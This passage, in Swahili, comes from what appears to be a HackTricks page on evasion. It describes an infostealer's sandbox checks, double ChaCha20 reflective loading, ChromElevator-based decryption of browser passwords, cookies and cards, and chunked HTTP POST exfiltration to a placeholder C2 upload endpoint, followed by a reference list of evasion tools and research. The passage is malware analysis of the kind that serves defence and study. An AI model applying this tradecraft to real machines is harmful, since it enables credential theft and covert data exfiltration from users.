- Variant B hukagua sifa za mfumo (idadi ya chini ya michakato, muda mfupi tangu mfumo uwashe), huita `OpenServiceA("VBoxGuest")` ili kutambua VirtualBox additions, na hukagua muda kabla na baada ya kusubiri ili kugundua single-stepping. Hit yoyote husababisha kusitisha kabla modules hazijazinduliwa.

### Helper isiyo na faili + upakiaji wa kutafakari wa ChaCha20 mara mbili

- DLL/EXE kuu hupachika Chromium credential helper ambayo huandikwa kwenye diski au kupakiwa mwenyewe kwenye kumbukumbu; katika hali isiyo na faili, hutatua imports/relocations yenyewe ili kusiandikwe mabaki ya helper.
- Helper hiyo huhifadhi DLL ya hatua ya pili iliyosimbwa mara mbili kwa ChaCha20 (funguo mbili za baiti 32 + nonces za baiti 12). Baada ya mizunguko yote miwili, hupakia blob hiyo kwa reflective loading (bila `LoadLibrary`) na kuita exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` zinazotokana na [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Taratibu za ChromElevator hutumia direct-syscall reflective process hollowing kuingiza msimbo kwenye Chromium browser inayoendelea, kurithi funguo za AppBound Encryption, na kusimbua moja kwa moja passwords/cookies/credit cards kutoka kwenye SQLite databases licha ya uimarishaji wa ABE.

### Ukusanyaji wa moduli ndani ya kumbukumbu na uchujaji wa data kwa HTTP katika vipande

- `create_memory_based_log` hupitia jedwali la kimataifa la function-pointer `memory_generators` na kuanzisha thread moja kwa kila module iliyowezeshwa (Telegram, Discord, Steam, screenshots, documents, browser extensions, n.k.). Kila thread huandika matokeo kwenye shared buffers na kuripoti idadi ya faili baada ya muda wa kusubiri wa takriban sekunde 45.
- Ikikamilika, kila kitu hubanwa kuwa ZIP kwa kutumia library ya `miniz` iliyounganishwa tuli kama `%TEMP%\\Log.zip`. Kisha `ThreadPayload1` husubiri sekunde 15 na kutuma archive hiyo kwa vipande vya MB 10 kupitia HTTP POST kwenda `http://<C2>:6767/upload`, huku ikiiga mpaka wa browser wa `multipart/form-data` (`----WebKitFormBoundary***`). Kila kipande huongeza `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` kwa hiari, na kipande cha mwisho huongeza `complete: true` ili C2 ijue kuwa kuunganisha tena kumekamilika.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, hakuna tena ruhusa za bure kwa malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – nyaraka](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – mfano](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – mfano](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC ya call-stack spoofing](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Msururu Mpya wa Maambukizi na Obfuscation inayotegemea ConfuserEx ya DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Je, unapaswa kuiamini zero trust yako? Kukwepa ukaguzi wa Zscaler wa hali ya kifaa](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Kabla ya ToolShell: Kuchunguza Operesheni za Awali za Ransomware za Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Kutumia Vibaya Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Orodha ya Forwarded Exports za Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Mpangilio wa utafutaji wa dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Usalama wa michakato na haki za ufikiaji](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Marejeo ya EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Kizindua cha CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Kukabiliana na EDR kwa Usaidizi wa Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Vunja Kinga ya Windows Defender kwa Mbinu ya Folder Redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Marejeo ya amri ya mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Chini ya Pazia Safi: Kutoka RAT hadi Builder hadi Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer Inakuja Mjini: Infostealer Mpya na Yenye Malengo Makubwa](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Usimbuaji wa Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Kushinda Malware ya Node.js kwa Ufuatiliaji wa API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Kumlaza Adaptix kwa Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Uwekaji Sumu wa Vigezo vya Mchakato](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, na Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Obfuscation ya usingizi ya Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Kuficha Dotnet Etw Yako](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Kutumia Vibaya Chrome Remote Desktop Katika Operesheni za Red Team: Mwongozo wa Vitendo](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Kugeuza Driver ya Urekebishaji ya Defender kuwa Primitive ya Operesheni za Kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Msimbo saidizi wa MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Kuunda Functions Zinazojificha kwa Kutumia LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Msimbo chanzo wa TwoSevenOneT - InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Function ya CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Kuunda Child Process yenye Input na Output Zilizogeuzwa Mwelekeo](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Kuunda Upya Zana za C# kwa WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Kucompila Miradi ya C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept na msimbo chanzo](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Kutumia Vibaya Internals za Thread Pool kwa DLL Injection isiyotumia Shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Dataset ya benchmark ya EMBER2024 na zana za thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Kutumia EMBER2024 Kutathmini Red Team Implants](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Kukwepa Ugunduzi Unaotegemea Machine Learning](https://msecops.de/blog/posts/ml-evasion/)
{{#include ../banners/hacktricks-training.md}}
